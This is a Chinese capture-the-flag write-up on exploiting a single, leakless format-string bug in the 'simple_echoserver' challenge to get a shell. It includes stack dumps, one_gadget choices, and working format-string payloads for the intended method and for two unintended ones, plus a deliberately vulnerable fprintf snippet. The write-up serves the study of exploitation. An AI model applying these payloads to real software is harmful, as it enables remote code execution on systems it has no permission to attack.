# Writeup

## 概述

（本题只是一些小伎俩，不像本次比赛其他几道PWN题那样硬核）  

sub_13C1 (loginfo) 函数有一个明显的格式化字符串漏洞，但是只触发了一次，而且远程环境的stderr被重定向到了/dev/null，因此无法泄露。  

程序是64位的ELF文件，保护全开（Full RELRO + PIE + NX enabled）。  
远程环境是 Ubuntu 18.04，[glibc 2.27](http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb)。  

## 预期解

预期解是在**无泄漏**的情况下**只利用一次**格式化字符串漏洞获得shell。  

在0x1415处下断点（fprintf之前），观察此时栈的情况：  
```
00:0000│ rsp  0x7fffffffe150 ◂— 0x0
01:0008│      0x7fffffffe158 —▸ 0x555555558160 (global_userinfo) ◂— 0x636261 /* 'abc' */
02:0010│ rbp  0x7fffffffe160 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2a0 —▸ 0x5555555554e0 (__libc_csu_init) ◂— endbr64
03:0018│      0x7fffffffe168 —▸ 0x555555555443 (serve+38) ◂— lea    rdi, [rip + 0xc5b]
04:0020│      0x7fffffffe170 ◂— 0x0
... ↓
06:0030│      0x7fffffffe180 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2a0 —▸ 0x5555555554e0 (__libc_csu_init) ◂— endbr64
07:0038│      0x7fffffffe188 —▸ 0x7ffff7dcfa00 (_IO_2_1_stdin_) ◂— 0xfbad208b
08:0040│      0x7fffffffe190 ◂— 0xd68 /* 'h\r' */
09:0048│      0x7fffffffe198 —▸ 0x7ffff7a71148 (__GI__IO_file_underflow+296) ◂— test   rax, rax
0a:0050│      0x7fffffffe1a0 ◂— 0xf705fa00
0b:0058│      0x7fffffffe1a8 ◂— 0xffffffffffffffff
0c:0060│      0x7fffffffe1b0 —▸ 0x5555555550f0 (_start) ◂— endbr64
0d:0068│      0x7fffffffe1b8 ◂— 0xa /* '\n' */
0e:0070│      0x7fffffffe1c0 —▸ 0x7fffffffe260 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2a0 —▸ 0x5555555554e0 (__libc_csu_init) ◂— ...
0f:0078│      0x7fffffffe1c8 —▸ 0x5555555550f0 (_start) ◂— endbr64
10:0080│      0x7fffffffe1d0 —▸ 0x7fffffffe380 ◂— 0x1
11:0088│      0x7fffffffe1d8 ◂— 0x0
... ↓
13:0098│      0x7fffffffe1e8 —▸ 0x555555555348 (readlong+127) ◂— mov    rcx, qword ptr [rbp - 0x18]
14:00a0│      0x7fffffffe1f0 —▸ 0x7ffff7dcfa00 (_IO_2_1_stdin_) ◂— 0xfbad208b
15:00a8│      0x7fffffffe1f8 —▸ 0x7fffffffe203 ◂— 0xffe3800000000000
16:00b0│      0x7fffffffe200 ◂— 0x333231 /* '123' */
17:00b8│      0x7fffffffe208 —▸ 0x7fffffffe380 ◂— 0x1
18:00c0│      0x7fffffffe210 ◂— 0x0
19:00c8│      0x7fffffffe218 —▸ 0x7ffff7a723f2 (_IO_default_uflow+50) ◂— cmp    eax, -1
1a:00d0│      0x7fffffffe220 ◂— 0x36 /* '6' */
1b:00d8│      0x7fffffffe228 —▸ 0x555555558163 (global_userinfo+3) ◂— 0x0
1c:00e0│      0x7fffffffe230 —▸ 0x7fffffffe260 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2a0 —▸ 0x5555555554e0 (__libc_csu_init) ◂— ...
1d:00e8│      0x7fffffffe238 —▸ 0x55555555528d (readline+39) ◂— mov    r12d, eax
1e:00f0│      0x7fffffffe240 ◂— 0x10055556029 /* ')`UU' */
1f:00f8│      0x7fffffffe248 ◂— 0xc700f7c4629bc400
20:0100│      0x7fffffffe250 ◂— 0x0
... ↓
22:0110│      0x7fffffffe260 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2a0 —▸ 0x5555555554e0 (__libc_csu_init) ◂— endbr64
23:0118│      0x7fffffffe268 —▸ 0x5555555553b3 (getuserinfo+80) ◂— mov    rdx, qword ptr [rbp - 8]
24:0120│      0x7fffffffe270 —▸ 0x7fffffffe380 ◂— 0x1
25:0128│      0x7fffffffe278 ◂— 0xc700f7c4629bc400
26:0130│      0x7fffffffe280 —▸ 0x7fffffffe2a0 —▸ 0x5555555554e0 (__libc_csu_init) ◂— endbr64
27:0138│      0x7fffffffe288 —▸ 0x5555555554d0 (main+30) ◂— mov    eax, 0
28:0140│      0x7fffffffe290 —▸ 0x7fffffffe380 ◂— 0x1
29:0148│      0x7fffffffe298 ◂— 0x0
2a:0150│      0x7fffffffe2a0 —▸ 0x5555555554e0 (__libc_csu_init) ◂— endbr64
2b:0158│      0x7fffffffe2a8 —▸ 0x7ffff7a05b97 (__libc_start_main+231) ◂— mov    edi, eax
2c:0160│      0x7fffffffe2b0 ◂— 0x1
2d:0168│      0x7fffffffe2b8 —▸ 0x7fffffffe388 —▸ 0x7fffffffe61f ◂— '/root/simple_echoserver'
2e:0170│      0x7fffffffe2c0 ◂— 0x100008000
2f:0178│      0x7fffffffe2c8 —▸ 0x5555555554b2 (main) ◂— push   rbp
30:0180│      0x7fffffffe2d0 ◂— 0x0
31:0188│      0x7fffffffe2d8 ◂— 0x224c5df7bd9bad4d
32:0190│      0x7fffffffe2e0 —▸ 0x5555555550f0 (_start) ◂— endbr64
33:0198│      0x7fffffffe2e8 —▸ 0x7fffffffe380 ◂— 0x1
34:01a0│      0x7fffffffe2f0 ◂— 0x0
... ↓
36:01b0│      0x7fffffffe300 ◂— 0x771908a2d13bad4d

```

当前函数调用栈是 main->sub_141D(serve)->sub_13C1(loginfo)， 0x7fffffffe160—>0x7fffffffe280—>0x7fffffffe2a0 是RBP链。  

利用这个RBP链可以进行**栈迁移**：通过%7$hhn修改0x7fffffffe280处的最低字节，经过两次"leave"指令之后（恰好在main函数返回之前），修改后的值被移入RSP。  
如果能在栈上布置一个one-gadget地址，那么只需栈迁移到这里即可得到shell。  

格式化字符串的输出宽度（field width）可以是一个整数，也可以用 **"\*"** 或 **"\*m$"** 表示从参数中读取。  
所以可以从栈里取一个libc的地址作为宽度然后接上一个常数宽度的格式化串，实现**libc地址+固定偏移**，然后利用"%n"写回栈里，这样就无需泄露地址了。  
（这个过程可能会输出几个GB的数据，但stderr已被重定向到/dev/null，所以速度很快）  

输出宽度以及printf的输出长度不能超过int类型的最大值（0x7fffffff），否则"%n"的写入会失败。  
所以上面的方法只能控制低4个字节的写入，需要找到一个高4个字节位于libc范围内的值的地址的作为写入的目标地址。  

注意到0x7fffffffe1f8处的值是指向栈的指针，这个值可以通过控制sub_12C9(readlong)函数的输入长度来改变。如果 **"Your phone: "的输入长度为24** ，这个值会指向0x7fffffffe218，而0x7fffffffe218处是一个libc地址。  
现在 **在栈上得到了一个指向libc地址的指针** ，可以使用上面的方法了。  

把0x7fffffffe218的值修改为one-gadget并完成栈迁移之后，```one_gadget libc-2.27.so``` 给出的三个gadget看起来都不满足：  
```
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

用 ```one_gadget -l 1 libc-2.27.so``` 搜索更多的gadgets，可以发现 0xe5863 满足条件（在main函数返回时）：  
```
0xe5863 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL
```

> 0x10a38c 的 one-gadget 也可以用。  
> 虽然 \[rsp+0x70\] (\[0x7fffffffe290\]) 是 0x7fffffffe380 不是 NULL， 但是 \[rsp+0x70\] 的值是一个指向可读内存的指针 且 \[rsp+0x78\] 是 NULL, 这样在 execve "/bin/sh" 调用时, argv\[0\] 有效且  argv\[1\] 是 NULL。  

最终的 exp: （完整脚本在 [exp.py](./exp.py)）  
```
Your name: %3c%7$hhn%357715c%*30$c%26$n
Your phone: 000000000000000000000000
```

> 这里栈的情况如下：  
> （断点在0x1415）  
> ```
>  7$:    02:0010│ rbp  0x7fffffffe160 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2a0
> 30$:    19:00c8│      0x7fffffffe218 —▸ 0x7ffff7a72300
> 26$:    15:00a8│      0x7fffffffe1f8 —▸ 0x7fffffffe218 —▸ 0x7ffff7a72300
> ```

成功率：1/32  
（栈迁移需要爆破栈地址半个字节，1/16概率；"\*" + "%n" 方法需要 libc 低4个字节位于signed int的正数范围内，1/2 概率 ）  


## 其他

题目没有出好造成了很多非预期解……  
（比赛中只有两个队是用预期解做出来的）  

vfprintf函数按顺序扫描并**立即**处理格式化字符串，在遇到**首个**"$"之前不复制参数，所以前面的"%n"可以修改后面的参数。  
当vfprintf遇到首个位置参数"$"时，vfprintf把**所有需要用到的参数都复制到了内部的缓冲区中**。从这之后，前面的"%n"不再会对后面的参数产生影响。  

借助栈里指向栈地址的指针（如 0x7fffffffe160 —▸ 0x7fffffffe280），可以先修改指向的栈地址的最后一个字节让它指向目标栈地址（在格式化字符串的首个"$"之前完成），然后通过修改后的栈地址修改目标栈地址处的值。  
这是一个例子：（1/32的成功率）
```
Your name: %c%c%c%c%c%150c%hhn%801828c%*48$c%43$n%61c%7$hhn
```
"%hhn"通过第7个参数（0x7fffffffe160 —▸ 0x7fffffffe280）把 0x7fffffffe280 里的值 从 0x7fffffffe2a0 改为 0x7fffffffe2a8（0x7fffffffe2a8里保存着main函数的返回地址）。  
然后"%\*48$c"从0x7fffffffe2a8(__libc_start_main_ret)取值作为宽度，"%43$n" 通过 0x7fffffffe280 里的指针修改 0x7fffffffe2a8 处的值为 0xe5863 的 one-gadget。  
最后的"%7$hhn"恢复0x7fffffffe280处的值为0x7fffffffe2a0，保持RBP链的正确从而能正常返回到main函数。  

<br />  

另一中方法不需要利用格式化字符串的"\*"。注意到栈里（0x7fffffffe1c8）有_start函数的地址，只需栈迁移到 0x7fffffffe1c0，main函数返回时就会重新进入_start，从而无限多次利用程序里的格式化字符串漏洞。  
之后可以分步修改一个指向栈的指针，然后部分修改栈上残留的程序地址为stderr的地址（相对于程序基地址偏移0x4040），再部分修改stderr为stdout即可进行泄露。  
这种方法成功率为1/4096，需要爆破半字节栈地址、半字节程序地址和半字节libc地址。  

<br />  

> 如果比赛期间早点搞明白这几个非预期，可能第二天会放一道Simple Echoserver V2，把"Your name: "的输入长度从256缩小到32，同时只允许调用一次有漏洞的fprintf： 
> ```
> void getuserinfo(struct userinfo *info) {
> 	puts("For audit, please provide your name and phone number: ");
> 	printf("Your name: ");
> 	// readline(info->name, 256);
> 	readline(info->name, 32);    // 32 bytes is enough
> 	printf("Your phone: ");
> 	info->phone = readlong();
> }
> 
> void loginfo(struct userinfo *info) {
> 	snprintf(global_buf, BUF_LEN, "[USER] name: %s; phone: %ld\n", info->name, info->phone);
> 	fprintf(stderr, global_buf);    // vuln!
> 	stderr = NULL;    // only log once
> }
> ```
